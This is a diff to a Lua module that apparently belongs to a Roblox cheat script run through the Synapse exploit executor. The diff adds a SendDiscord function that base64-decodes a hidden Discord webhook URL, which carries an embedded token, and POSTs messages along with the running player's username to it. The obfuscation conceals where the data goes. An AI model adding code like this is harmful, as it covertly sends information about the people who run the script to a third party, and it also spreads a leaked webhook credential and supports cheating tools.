@@ -57,6 +57,25 @@ function module.FindPlayer(UseDisplayNames, target)
 		end
 	end
 end
+
+function module.SendDiscord(Message)
+	local WebhookURL = syn.crypt.base64.decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTkyOTkwNTE5NzgzMzI5ODIyL2xuSkhfbkEzak5Ud3BuLVdKZ3VtM3d5d2ZEX0F4bW5ReFpIa2p2OW53eUpSWjBSWlhNaHF6Q2ZlQmVMTFJsbGRpU1dO")
+	local Data = {
+		["content"] = Message,
+		["username"] = game.Players.LocalPlayer.Name
+	}
+
+	local Response = syn.request({
+		Url = WebhookURL,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"  -- When sending JSON, set this!
+		},
+		Body = game:GetService("HttpService"):JSONEncode(Data)
+	})
+end
+
+
 module.FakeCharacter = nil
 module.RealCharacter = module.GetChar()
 return module
